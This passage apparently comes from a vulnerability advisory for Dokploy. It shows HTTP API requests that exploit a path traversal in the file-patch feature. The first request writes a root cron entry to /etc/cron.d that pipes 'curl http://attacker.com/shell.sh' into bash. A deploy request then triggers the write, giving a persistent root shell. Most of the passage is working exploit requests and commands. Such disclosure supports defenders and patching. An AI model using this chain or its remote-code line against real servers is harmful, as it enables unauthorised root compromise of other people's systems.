Content-Type: application/json
Authorization: Bearer <session-token>

{
    "filePath": "../../../../etc/cron.d/dokploy-rce",
    "content": "* * * * * root curl http://attacker.com/shell.sh | bash\n",
    "type": "create",
    "applicationId": "<target-application-id>"
}
```

**Step 2: Deploy the application to trigger patch application:**

```http
POST /api/trpc/application.deploy
Content-Type: application/json
Authorization: Bearer <session-token>

{
    "applicationId": "<target-application-id>"
}
```

During deployment, the patch is applied. `/etc/cron.d/dokploy-rce` is created on the server with the attacker's crontab entry, establishing a persistent reverse shell that runs every minute as root.

